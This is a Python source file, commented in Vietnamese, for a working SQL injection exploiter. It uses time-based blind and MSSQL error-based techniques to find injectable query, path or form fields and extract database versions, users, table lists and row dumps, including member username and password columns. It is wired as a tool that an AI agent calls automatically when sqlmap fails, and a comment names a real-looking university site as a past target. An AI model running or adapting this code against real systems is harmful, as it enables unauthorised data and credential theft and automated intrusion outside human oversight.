#!/usr/bin/env python3
"""
aixsec-x — sqli_blind_poc.py
SQLi time-based blind exploiter KHÔNG cần sqlmap (Python thuần: requests + timing).

Hỗ trợ 3 kiểu vị trí inject:
  - query:  /product.php?id=123          →  ?id=123' AND (cond) AND SLEEP(3)-- -
  - path:   /search/123.html             →  /search/123%27%20AND%20(cond)%20AND%20SLEEP(3)--%20-.html
  - form:   POST ?keyword=tin+tuc        →  data: keyword=tin tuc' AND (cond)-- -

Engine:
  - mysql (mặc định): SLEEP(n) cho time-based, VERSION()/DATABASE()/USER(),
    tables/columns/dump đầy đủ (GROUP_CONCAT + LIMIT).
  - mssql: 2 chiến thuật:
      a) error-based oracle (ưu tiên): CONVERT(int,(expr)) → đọc giá trị từ
         response 500 "Conversion failed when converting the nvarchar value
         'X' to data type int". Hoạt động cả trong context LIKE ('%input%')
         có ngoặc, nơi stacked '; IF(...) WAITFOR DELAY ...' vỡ cú pháp
         ("Incorrect syntax near ')'"). 3 SHAPES đóng quote/ngoặc.
      b) time-based: WAITFOR DELAY '0:0:n' (IF (cond) WAITFOR DELAY ...)
         — fallback khi oracle không ăn.
    @@VERSION/DB_NAME()/SUSER_SNAME() + tables/columns/dump đầy đủ
    (STUFF + FOR XML PATH cho danh sách, TOP 1 + ROW_NUMBER cho dump).

Dùng làm:
  1) CLI độc lập (chạy tay trên máy Kali)
  2) Executor cho ToolSpec `sqli_blind_extract` của AIXSEC-X
     (model gọi tool → exploit tự động khi sqlmap fail)

Chạy CLI:
  python3 sqli_blind_poc.py -u "https://target/search/123.html" --detect-only
  python3 sqli_blind_poc.py -u "https://target/search/123.html" --dump-table fs_members --columns id,username,password
  python3 sqli_blind_poc.py -u "https://target/product.php?id=1" --get-dbname --delay 2 --threshold 1.6 --max-len 30
  python3 sqli_blind_poc.py -u "https://target/TimKiem" --engine mssql --method post \
      --param keyword --data "keyword=tin tuc" --get-version --get-dbname --get-user
  python3 sqli_blind_poc.py -u "https://target/TimKiem" --engine mssql --method post \
      --param keyword --data "keyword=tin tuc" --list-tables --dump-table News \
      --columns id,title
"""
from __future__ import annotations

import re

import argparse
import json
import sys
import time
from urllib.parse import parse_qs, parse_qsl, quote, urlencode, urlparse, urlunparse

import requests

# charset: ưu tiên ký tự hay gặp (digit, lower, bound) — ít probe hơn
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ _.,:;@-+/%"
_USER_AGENT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")


class MsSqlErrorOracle:
    """MSSQL error-based oracle: đọc dữ liệu từ chính response 500.

    Kỹ thuật: ép ép buộc chuyển kiểu chuỗi → int trong cùng một câu SELECT
        ... AND CONVERT(int, (expr)) -- -
    SQL Server trả lỗi kèm HTTP 500:
        "Conversion failed when converting the nvarchar value 'X' to data type int"
    → kết quả của expr nằm ngay trong body response (không cần timing).

    Lý do tồn tại (tbu.edu.vn): context LIKE có ngoặc
        ... (Field LIKE '%input%') OR ...
    stacked '; IF (cond) WAITFOR DELAY '0:0:n' ...' vỡ cú pháp vì comment
    -- - chỉ chặn phần dư của câu stacked, không chặn ngoặc/`%'` của câu gốc
    → "Incorrect syntax near ')'". Biến thể một câu như dưới (đóng quote và/hoặc
    đóng luôn ngoặc) vẫn hợp lệ → trích được value từ message lỗi.

    SHAPES: thử nhiều cách đóng quote/ngoặc; shape đầu tiên cho lỗi conversion
    được ghi nhận và dùng lại cho mọi lần đọc sau. Đọc theo chunk
    SUBSTRING((expr),pos,100) để không phụ thuộc độ dài message lỗi.
    """

    VALUE_RX = re.compile(
        r"converting the (?:nvar)?char value '(.*?)' to data type int",
        re.I | re.S)

    def __init__(self, url: str, method: str = "post", param: str = "",
                 data=None, headers: dict | None = None, timeout: int = 15,
                 chunk: int = 100):
        self.url = url
        self.method = method.lower()
        self.param = param
        self.data = self._normalize_data(data)
        self.timeout = int(timeout)
        self.chunk = int(chunk)
        self.shape = None          # index SHAPE đã probe thành công
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": _USER_AGENT})
        if headers:
            self.s.headers.update(headers)

    # ────────────── helpers ──────────────
    @staticmethod
    def _normalize_data(data) -> dict:
        """Form data → dict[str, list[str]] (dict giữ nguyên list value)."""
        if not data:
            return {}
        if isinstance(data, dict):
            return {k: v if isinstance(v, list) else [str(v)] for k, v in data.items()}
        return parse_qs(data)

    def _templates(self, inner: str) -> list[str]:
        """inner = đoạn inject sau quote đóng (vd ' AND CONVERT(int,(x))).

        3 SHAPES đóng quote/ngoặc cho các context:
          1) '<inner>-- -              → LIKE '%...%' không ngoặc
          2) ')<inner>-- -             → (Field LIKE '%...%') 1 ngoặc
          3) '))<inner>-- -            → ((Field LIKE '%...%')) 2 ngoặc
        """
        return [
            f"{inner}-- -",
            f"){inner}-- -",
            f")){inner}-- -",
        ]

    def _inject(self, expr: str) -> list[str]:
        return self._templates(f"' AND CONVERT(int,({expr}))")

    def _request(self, injected: str) -> tuple[int, str]:
        """Gửi 1 payload → (status, toàn bộ body). Body đầy đủ (không cắt 300)
        vì giá trị cần đọc nằm sâu trong message lỗi của trang lỗi ASP.NET."""
        if self.method == "post":
            body = {k: list(v) for k, v in self.data.items()}
            body[self.param] = [injected]
            try:
                r = self.s.post(self.url, data=body, timeout=self.timeout,
                                allow_redirects=True)
                return r.status_code, r.text or ""
            except requests.RequestException:
                return 0, ""
        # GET — chèn injected vào query string tại self.param
        p = urlparse(self.url)
        out = []
        for k, v in parse_qsl(p.query, keep_blank_values=True):
            if k == self.param:
                out.append((k, injected))
            else:
                out.append((k, v))
        url = urlunparse((p.scheme, p.netloc, p.path, "", urlencode(out), ""))
        try:
            r = self.s.get(url, timeout=self.timeout, allow_redirects=True)
            return r.status_code, r.text or ""
        except requests.RequestException:
            return 0, ""

    def _read(self, expr: str) -> str | None:
        """Đọc 1 chunk bằng SHAPE đã probe. None = không ra lỗi conversion."""
        if self.shape is None:
            return None
        tpl = self._inject(expr)[self.shape]
        _, body = self._request(tpl)
        m = self.VALUE_RX.search(body)
        return m.group(1).replace("''", "'") if m else None

    # ────────────── detect ──────────────
    def detect(self) -> bool:
        """Probe @@VERSION qua lỗi conversion → chọn SHAPE hoạt động."""
        for i, tpl in enumerate(self._inject("SELECT @@VERSION")):
            _, body = self._request(tpl)
            m = self.VALUE_RX.search(body)
            if m:
                self.shape = i
                print(f"[+] MSSQL error-based oracle OK (shape {i}): "
                      f"{m.group(1).replace("''", "'")[:60]}")
                return True
        print("[-] MSSQL error-based oracle: không thấy lỗi conversion")
        return False

    # ────────────── extraction ──────────────
    def extract(self, expr: str, max_chunks: int = 80) -> str:
        """Đọc expr theo chunk SUBSTRING((expr),pos,chunk) rồi ghép lại."""
        if self.shape is None and not self.detect():
            return ""
        got = ""
        for i in range(max_chunks):
            pos = i * self.chunk + 1
            val = self._read(f"SUBSTRING(({expr}),{pos},{self.chunk})")
            if val is None or val == "":
                if i == 0:
                    return ""
                break
            got += val
            print(f"\r    [{expr}] chunk {i + 1} → {len(got)} chars   ",
                  end="", flush=True)
            if len(val) < self.chunk:
                break
        print()
        return got

    def version(self) -> str:
        return self.extract("@@VERSION")

    def database(self) -> str:
        return self.extract("DB_NAME()")

    def user(self) -> str:
        return self.extract("SUSER_SNAME()")

    def tables(self, db: str = "", max_items: int = 30) -> list[str]:
        base = ("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
                "WHERE TABLE_TYPE='BASE TABLE'")
        if db:
            base += f" AND TABLE_CATALOG=N'{db}'"
        q = (f"STUFF((SELECT N','+TABLE_NAME FROM ({base}) AS t "
             "FOR XML PATH('')),1,1,N'')")
        return [x for x in self.extract(q).split(",") if x][:max_items]

    def columns(self, table: str, db: str = "") -> list[str]:
        cond = f"TABLE_NAME=N'{table}'"
        if db:
            cond += f" AND TABLE_CATALOG=N'{db}'"
        q = (f"STUFF((SELECT N','+COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS "
             f"WHERE {cond} FOR XML PATH('')),1,1,N'')")
        return [c for c in self.extract(q).split(",") if c]

    def dump(self, table: str, columns: list[str], limit: int = 10) -> list[dict]:
        """MSSQL: TOP 1 + ROW_NUMBER (OFFSET/FETCH cấm trong scalar subquery)."""
        rows = []
        for i in range(1, limit + 1):
            row = {}
            for col in columns:
                q = (f"SELECT TOP 1 CAST({col} AS nvarchar(4000)) FROM "
                     f"(SELECT {col}, ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) "
                     f"AS rn FROM {table}) AS t WHERE t.rn={i}")
                row[col] = self.extract(q)
            if not row or all(not v for v in row.values()):
                break
            rows.append(row)
        return rows


class TimeBlindExploiter:
    """Detect + extract dữ liệu bằng time-based blind SQLi (binary search)."""

    def __init__(self, url: str, delay: float = 3.0, threshold: float = 2.5,
                 timeout: int = 15, headers: dict | None = None,
                 engine: str = "mysql", method: str = "get",
                 param: str | None = None, data=None):
        if engine not in ("mysql", "mssql"):
            raise ValueError(f"engine phải là mysql hoặc mssql (nhận {engine!r})")
        self.engine = engine
        self.url = url
        self.delay = max(0.5, float(delay))
        self.threshold = max(0.7, float(threshold))
        self.timeout = int(timeout)
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": _USER_AGENT})
        if headers:
            self.s.headers.update(headers)

        p = urlparse(url)
        self.scheme = p.scheme or "http"
        self.netloc = p.netloc
        self.path = p.path
        self.query = p.query
        self.fragment = p.fragment

        self.params = parse_qs(p.query)
        self.param = param or None  # param/field bị inject (query hoặc POST form)
        self.path_seg_idx = None     # index segment trong path (nếu mode=path)
        self.mode = None             # "query" | "path" | "form"
        self.orig_value = ""         # giá trị gốc (param value / path segment)
        self.quote = ""              # "'" | '"' | "" — quote đóng được tìm thấy
        self.comment = "-- -"        # "-- -" | "#"
        self.baseline = 0.0
        self.method = method.lower()  # "get" | "post"
        self.data = data              # form data POST ("a=1&b=2" hoặc dict)
        self.oracle = None            # MsSqlErrorOracle nếu error-based ăn
        self.technique = "time-based"  # "time-based" | "error-based-mssql"

    # ────────────── thiết lập vị trí inject ──────────────
    def _locate_injection(self) -> str:
        """Tìm vị trí inject: POST form | query param | path segment."""
        if self.method == "post" and self.data:
            return self._locate_form()
        if self.param:
            vals = self.params.get(self.param)
            if vals:
                self.orig_value = str(vals[0]).strip()
                self.mode = "query"
                return f"query param '{self.param}' = {self.orig_value}"
        for k, v in self.params.items():
            if v and str(v[0]).strip().lstrip("-").isdigit():
                self.param, self.orig_value = k, str(v[0]).strip()
                self.mode = "query"
                return f"query param '{k}' = {self.orig_value}"
        # path: /search/123.html → segment cuối số
        segs = [s for s in self.path.split("/") if s]
        for i, seg in enumerate(segs):
            core = seg.split(".")[0] if "." in seg else seg
            if core.lstrip("-").isdigit():
                self.path_seg_idx = i
                self.orig_value = core
                self.mode = "path"
                return f"path segment [{i}] = {seg}"
        return ""

    def _locate_form(self) -> str:
        """POST form: dùng param chỉ định (nếu có) hoặc field đầu tiên có value."""
        data = self._form_data()
        self.mode = "form"
        if self.param and self.param in data:
            self.orig_value = str(data[self.param][0])
            return f"form field '{self.param}' = {self.orig_value!r}"
        if self.param:
            self.orig_value = ""
            return f"form field '{self.param}' (không có trong data)"
        for k, v in data.items():
            if v and str(v[0]).strip():
                self.param, self.orig_value = k, str(v[0]).strip()
                return f"form field '{k}' = {self.orig_value!r}"
        return ""

    def _form_data(self) -> dict:
        """Data POST (dict hoặc query-string) → dict[str, list[str]]."""
        if isinstance(self.data, dict):
            return {k: v if isinstance(v, list) else [str(v)]
                    for k, v in self.data.items()}
        return parse_qs(self.data or "")

    # ────────────── build URL với payload ──────────────
    def _build_url(self, injected: str) -> str:
        if self.mode == "query":
            q = {}
            for k, v in self.params.items():
                q[k] = [injected] if k == self.param else list(v)
            return urlunparse((self.scheme, self.netloc, self.path, "",
                               urlencode(q, doseq=True), self.fragment))
        # path mode — URL-encode payload, GIỮ suffix (.html) để không vỡ routing
        segs = [s for s in self.path.split("/") if s]
        raw_seg = segs[self.path_seg_idx]
        suffix = ""
        if "." in raw_seg:
            core, suffix = raw_seg.split(".", 1)
            suffix = "." + suffix  # vd: .html
        segs[self.path_seg_idx] = quote(injected, safe="") + suffix
        new_path = "/" + "/".join(segs)
        return urlunparse((self.scheme, self.netloc, new_path, "",
                           self.query, self.fragment))

    def _build_data(self, injected: str) -> dict:
        """Form data với param được thay bằng payload (giữ các field khác)."""
        d = self._form_data()
        d[self.param] = [injected]
        return d

    def _payload(self, expr: str) -> str:
        """Payload sau orig_value + quote.

        mysql: 'AND (expr) AND SLEEP(delay) -- -'
        mssql: '; IF (expr) WAITFOR DELAY '0:0:n' -- -'  (IF là statement → cần ;
               đóng câu SELECT trước; literal '0:0:n' tự cân bằng quote, phần thừa
               bị comment -- - chặn).
        """
        if self.engine == "mssql":
            return (f"{self.orig_value}{self.quote}; IF ({expr}) "
                    f"WAITFOR DELAY '0:0:{int(self.delay)}'{self.comment}")
        return (f"{self.orig_value}{self.quote} AND ({expr}) AND SLEEP({self.delay})"
                f"{self.comment}")

    def _request(self, injected: str) -> tuple[float, int, str]:
        if self.method == "post" and self.mode == "form":
            try:
                t0 = time.time()
                r = self.s.post(self.url, data=self._build_data(injected),
                                timeout=self.timeout, allow_redirects=True)
                return time.time() - t0, r.status_code, r.text[:300]
            except requests.RequestException as e:
                return 0.0, 0, str(e)
        url = self._build_url(injected)
        try:
            t0 = time.time()
            r = self.s.get(url, timeout=self.timeout, allow_redirects=True)
            return time.time() - t0, r.status_code, r.text[:300]
        except requests.RequestException as e:
            return 0.0, 0, str(e)

    # ────────────── detect ──────────────
    def detect(self) -> bool:
        """MSSQL: oracle error-based TRƯỚC, fallback time-based.

        Context LIKE có ngoặc làm stacked WAITFOR DELAY vỡ cú pháp
        → thử error-based oracle (đọc giá trị từ response 500) trước.
        """
        loc = self._locate_injection()
        if not loc:
            return False
        print(f"[*] Injection position: {loc}")
        if self.engine == "mssql" and self.mode != "path":
            orb = MsSqlErrorOracle(self.url, method=self.method,
                                   param=self.param or "",
                                   data=self._form_data(),
                                   headers=dict(self.s.headers),
                                   timeout=self.timeout)
            if orb.detect():
                self.oracle = orb
                self.technique = "error-based-mssql"
                print("[+] SQLi CONFIRMED (error-based oracle)")
                return True
            print("[-] Oracle không ăn → fallback time-based WAITFOR DELAY")
        t0, _, _ = self._request(self.orig_value)
        self.baseline = t0
        print(f"[*] Baseline: {t0:.2f}s")

        trials = []
        for q in ("'", '"', ""):
            for c in ("-- -", "#", ""):
                trials.append((q, c))
        for q, c in trials:
            self.quote, self.comment = q, c
            # mssql: probe vô điều kiện IF (1=1) WAITFOR DELAY.
            expr = "1=1" if self.engine == "mssql" else "SLEEP(%d)" % self.delay
            t, status, _ = self._request(self._payload(expr))
            delta = t - self.baseline
            print(f"    quote={q or 'none':<5} comment={c or 'none':<5} "
                  f"→ {t:.2f}s (delta {delta:+.2f}s)")
            if delta >= self.threshold:
                print(f"[+] SQLi CONFIRMED (delta {delta:.2f}s ≥ {self.threshold}s)")
                return True
        print("[-] SQLi NOT CONFIRMED")
        return False

    # ────────────── helpers ──────────────
    def _is_true(self, expr: str) -> bool:
        """(expr) TRUE → SLEEP chạy → slow response."""
        t, _, _ = self._request(self._payload(expr))
        return (t - self.baseline) >= self.threshold

    def _verify_char(self, expr: str, char: str) -> bool:
        return self._is_true(f"ASCII(SUBSTRING(({expr}),{self._pos},1))={ord(char)}")

    def extract_char(self, expr: str, pos: int, charset: str = CHARSET) -> str | None:
        """Binary search: ASCII(SUBSTRING((expr),pos,1)) >= ord(mid) AND SLEEP()."""
        low, high = 0, len(charset) - 1
        while low < high:
            mid = (low + high + 1) // 2
            cond = f"ASCII(SUBSTRING(({expr}),{pos},1))>={ord(charset[mid])}"
            if self._is_true(cond):
                low = mid
            else:
                high = mid - 1
        # verify bằng so khớp chính xác
        if self._is_true(f"ASCII(SUBSTRING(({expr}),{pos},1))={ord(charset[low])}"):
            return charset[low]
        return None

    def extract_string(self, expr: str, max_len: int = 50, charset: str = CHARSET) -> str:
        out = []
        for pos in range(1, max_len + 1):
            ch = self.extract_char(expr, pos, charset)
            if ch is None:
                if pos == 1:
                    return ""
                break
            out.append(ch)
            print(f"\r    [{expr}] pos {pos} = '{ch}'  (got: {''.join(out)})   ", end="", flush=True)
        print()
        return "".join(out)

    # ────────────── extraction convenience ──────────────
    def version(self) -> str:
        if self.oracle:
            return self.oracle.version()
        if self.engine == "mssql":
            # @@VERSION là chuỗi dài kiểu "Microsoft SQL Server 2019 ..."
            return self.extract_string("@@VERSION", 60)
        return self.extract_string("VERSION()", 40, "0123456789.-")

    def database(self) -> str:
        if self.oracle:
            return self.oracle.database()
        return self.extract_string("DB_NAME()" if self.engine == "mssql" else "DATABASE()", 50)

    def user(self) -> str:
        if self.oracle:
            return self.oracle.user()
        # SUSER_SNAME() không đối số = login hiện tại (MSSQL 2005+).
        return self.extract_string("SUSER_SNAME()" if self.engine == "mssql" else "USER()", 60)

    def tables(self, db: str = "", max_items: int = 30, max_len: int = 40) -> list[str]:
        if self.oracle:
            return self.oracle.tables(db, max_items)
        if self.engine == "mssql":
            raise NotImplementedError("tables (mssql) chỉ qua error-based oracle")
        q = ("SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES "
             + (f"WHERE TABLE_SCHEMA='{db}'" if db else ""))
        return [t for t in self.extract_string(q, 200).split(",") if t][:max_items]

    def columns(self, table: str, db: str = "", max_len: int = 200) -> list[str]:
        if self.oracle:
            return self.oracle.columns(table, db)
        if self.engine == "mssql":
            raise NotImplementedError("columns (mssql) chỉ qua error-based oracle")
        q = ("SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS "
             f"WHERE TABLE_NAME='{table}'"
             + (f" AND TABLE_SCHEMA='{db}'" if db else ""))
        return [c for c in self.extract_string(q, max_len).split(",") if c]

    def dump(self, table: str, columns: list[str], limit: int = 10,
             max_len: int = 60) -> list[dict]:
        if self.oracle:
            return self.oracle.dump(table, columns, limit)
        if self.engine == "mssql":
            raise NotImplementedError(
                "dump (mssql) chỉ qua error-based oracle — hoặc dùng sqlmap --dbms=mssql")
        rows = []
        for i in range(1, limit + 1):
            row = {}
            for col in columns:
                val = self.extract_string(
                    f"SELECT {col} FROM {table} LIMIT 1 OFFSET {i - 1}", max_len)
                row[col] = val
            if not row or all(not v for v in row.values()):
                break
            rows.append(row)
        return rows

    def report(self, action: str = "detect", **kw) -> dict:
        """Kết quả có cấu trúc cho ToolSpec `sqli_blind_extract`."""
        out = {"url": self.url, "confirmed": False, "data": {}}
        if not self.detect():
            out["error"] = "SQLi not confirmed"
            return out
        out["confirmed"] = True
        out["technique"] = self.technique
        out["mode"] = self.mode
        out["injection"] = f"{self.mode}@{self.param or self.path_seg_idx} quote={self.quote or 'none'}"
        if action in ("version", "detect"):
            out["data"]["version"] = self.version() if action == "version" else None
        elif action == "database":
            out["data"]["database"] = self.database()
        elif action == "user":
            out["data"]["user"] = self.user()
        elif action == "tables":
            if self.engine == "mssql" and not self.oracle:
                out["error"] = "tables chưa hỗ trợ mssql (time-based) — dùng sqlmap --dbms=mssql"
                return out
            out["data"]["tables"] = self.tables(kw.get("db_name", ""))
        elif action == "dump":
            cols = kw.get("columns", [])
            if not cols:
                out["error"] = "Cần columns"
                return out
            if not kw.get("table"):
                out["error"] = "Cần table"
                return out
            if self.engine == "mssql" and not self.oracle:
                out["error"] = "dump chưa hỗ trợ mssql (time-based) — dùng sqlmap --dbms=mssql"
                return out
            out["data"]["table"] = kw["table"]
            out["data"]["rows"] = self.dump(kw["table"], cols,
                                            int(kw.get("limit", 10)),
                                            int(kw.get("max_len", 60)))
        return out


def cli() -> int:
    ap = argparse.ArgumentParser(description="SQLi time-based blind exploiter (không sqlmap)")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--delay", type=float, default=3.0)
    ap.add_argument("--threshold", type=float, default=2.5)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--detect-only", action="store_true")
    ap.add_argument("--get-version", action="store_true")
    ap.add_argument("--get-user", action="store_true")
    ap.add_argument("--get-dbname", action="store_true")
    ap.add_argument("--list-tables", action="store_true")
    ap.add_argument("--dump-table", default="")
    ap.add_argument("--columns", default="")
    ap.add_argument("--db-name", default="")
    ap.add_argument("--limit", type=int, default=10)
    ap.add_argument("--max-len", type=int, default=60)
    ap.add_argument("--engine", choices=["mysql", "mssql"], default="mysql",
                    help="DB engine: mysql (SLEEP, mặc định) | mssql (oracle + WAITFOR DELAY)")
    ap.add_argument("--method", choices=["get", "post"], default="get",
                    help="Phương thức request: get (mặc định) | post (form)")
    ap.add_argument("--param", default="",
                    help="Param/field cần inject (mặc định tự tìm)")
    ap.add_argument("--data", default="",
                    help="Form data POST dạng 'a=1&b=2' (dùng với --method post)")
    ap.add_argument("--json", action="store_true", help="Xuất kết quả JSON")
    args = ap.parse_args()

    ex = TimeBlindExploiter(args.url, delay=args.delay, threshold=args.threshold,
                            timeout=args.timeout, engine=args.engine,
                            method=args.method, param=args.param or None,
                            data=args.data or None)
    print(f"===== SQLi blind exploiter =====")
    print(f"Target: {args.url}\n")

    if not ex.detect():
        print("\n[!] SQLi không xác nhận — thoát.")
        return 1
    if args.detect_only:
        print("\n[✓] CONFIRMED (detect-only)")
        return 0

    data = {}
    if args.get_version:
        data["version"] = f"Version: {ex.version()}"
    if args.get_user:
        data["user"] = f"User: {ex.user()}"
    if args.get_dbname:
        db = ex.database()
        data["database"] = f"Database: {db}"
        args.db_name = args.db_name or db
    if args.list_tables:
        data["tables"] = f"Tables: {ex.tables(args.db_name)}"
    if args.dump_table:
        cols = [c.strip() for c in args.columns.split(",") if c.strip()]
        rows = ex.dump(args.dump_table, cols, args.limit, args.max_len)
        data["dump"] = json.dumps(rows, ensure_ascii=False, indent=2)
    if args.json:
        print(json.dumps({"url": args.url, "confirmed": True, "data": data},
                         ensure_ascii=False, indent=2))
    else:
        for k, v in data.items():
            print(f"[+] {k}: {v}")
    return 0


if __name__ == "__main__":
    sys.exit(cli())
